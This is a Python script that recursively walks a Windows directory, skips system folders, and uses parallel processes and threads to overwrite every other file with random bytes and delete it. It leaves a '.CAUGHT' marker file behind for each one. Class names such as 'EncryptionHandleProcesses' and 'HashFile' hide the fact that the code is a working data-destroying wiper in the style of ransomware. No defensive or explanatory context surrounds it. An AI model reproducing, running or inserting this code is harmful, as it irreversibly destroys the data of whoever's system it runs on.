import os
import sys
import time
import threading
import multiprocessing
class EncryptionHandleProcesses():
    def HandleProcesses(self):
        while self.run is True:
            to_remove = []
            for i in range(len(self.processes)):
                with self.lock:
                    if self.processes[i].is_alive():
                        pass
                    else:
                        self.processes[i].join()
                        to_remove.append(self.processes[i])
            if len(to_remove) > 0:
                for process in to_remove:
                    self.processes.remove(process)
            else:
                time.sleep(0.2)
    def RunProcess(self):
        while self.run is True:
            while len(self.pool) > 0 and len(self.processes) < self.process_limit:
                with self.lock:
                    handle = multiprocessing.Process(target=self.encryptor.DiveIntoFiles, args=(self.pool[0],))
                    handle.start()
                    self.processes.append(handle)
                    self.pool.pop(0)
    def AddToPool(self, task:list):
        with self.lock:
            self.pool.append(task)
    def AtEnd(self):
        if len(self.pool) == 0 and len(self.processes) == 0:
            self.run = False
            self.handle_pool_thread.join()
            self.handle_processes_thread.join()
            return True
        return False
    def __init__(self, process_limit:int):
        self.process_limit = process_limit
        self.run = True
        self.lock = multiprocessing.Lock()
        self.pool = []
        self.processes = []
        self.handle_processes_thread = threading.Thread(target=self.HandleProcesses, args=(()))
        self.handle_processes_thread.start()
        self.handle_pool_thread = threading.Thread(target=self.RunProcess, args=(()))
        self.handle_pool_thread.start()
        self.encryptor = Encryptors()
class Encryptors():
    def DiveIntoFiles(self, files:list):
        threads = []
        for file_path in files:
            thread_handle = threading.Thread(target=self.HashFile, args=(file_path,))
            thread_handle.start()
            threads.append(thread_handle)
        while len(threads) > 0:
            remove_list = []
            for thread in threads:
                if thread.is_alive():
                    pass
                else:
                    thread.join()
                    remove_list.append(thread)
            for thread in remove_list:
                threads.remove(thread)
    def HashFile(self, file_path:str):
        try:
            with open(f"{file_path}.CAUGHT", 'wb') as file:
                file.write(os.urandom(100))
                file.close()
        except FileExistsError:
            pass
        except FileNotFoundError:
            pass
        with open(file_path, 'wb') as file:
            file.write(os.urandom(100))
            file.close()
        with open(file_path, 'wb') as file:
            file.write(os.urandom(10))
            file.close()
        os.remove(file_path)
def DiveIntoDrive(target_directory:str):
    handler = EncryptionHandleProcesses(int(os.cpu_count() * 1.5))
    file_count = 0
    to_scan = [target_directory]
    while True:
        items = []
        for item in to_scan:
            files = []
            try:
                with os.scandir(item) as dir:
                    for entry in dir:
                        try:
                            path = ""
                            if item[-1] != "\\":
                                path = f"{item}\\{entry.name}"
                            else:
                                path = f"{item}{entry.name}"
                            if path not in ("C:\\Windows", "C:\\Users\\Public", "C:\\Users\\Default", "C:\\Users\\Default User", "C:\\bootmgr", "C:\\BCD", "C:\\pagefile.sys", 
                                        "C:\\hiberfil.sys", "C:\\Program Files", "C:\\$WINDOWS.~BT", "C:\\System Volume Information") and 'python' not in path:
                                if entry.is_dir() and path:
                                    to_scan.append(path)
                                else:
                                    file_count += 1
                                    files.append(path)
                        except FileNotFoundError:
                            pass
                handler.AddToPool(files)
            except PermissionError as error:
                pass
            except FileNotFoundError as error:
                pass
            for item in items:
                to_scan.remove(item)
        break
    while handler.AtEnd() is False:
        time.sleep(0.05)
    return file_count
if __name__ == '__main__':
    count = DiveIntoDrive(sys.argv[1])
